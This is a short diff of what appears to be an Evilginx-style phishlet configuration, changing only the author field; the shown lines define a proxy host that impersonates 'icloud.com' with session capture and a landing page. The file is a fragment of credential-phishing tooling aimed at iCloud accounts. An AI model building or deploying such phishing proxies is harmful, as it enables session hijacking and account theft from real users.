@@ -1,4 +1,4 @@
-author: '@AN0NUD4Y'
+author: '@S19h4c3r'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'icloud.com', session: true, is_landing: true}
